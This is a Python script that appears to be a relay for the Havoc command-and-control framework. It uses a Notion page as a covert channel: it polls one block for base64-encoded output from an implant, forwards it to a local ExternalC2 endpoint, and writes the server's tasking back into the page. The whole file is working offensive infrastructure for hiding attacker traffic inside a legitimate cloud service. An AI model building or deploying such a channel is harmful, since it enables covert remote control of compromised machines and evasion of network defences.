import requests
import json
import socket
import time
import os
import sys
import base64
import random
import string
import platform
from havoc.externalc2 import ExternalC2

from notion.client import NotionClient
externalc2 = ExternalC2( "http://127.0.0.1:40056/ExtEndpoint" )
print("[+] connected to externalc2")
# Obtain the `token_v2` value by inspecting your browser cookies on a logged-in (non-guest) session on Notion.so
client = NotionClient(token_v2="PUT YOUR NOTION TOKEN HERE")
page = client.get_block("PUT YOUR NOTION PAGE URL HERE")

while True:
    print("Checking for callbacks")
    page.refresh()
    print(page.children)
    output = page.children[1].title.strip()
    if len(output) > 0:
        page.children[1].title = ""
        print("Received output: " + output)
        output_array = output.split("%_SEPARATOR_%")
        for x in output_array:
        	print(base64.b64decode(x))
        	response = externalc2.transmit(base64.b64decode(x))
        	print(response)
        	page.children[0].title += base64.b64encode(response).decode('utf-8')
    time.sleep(5)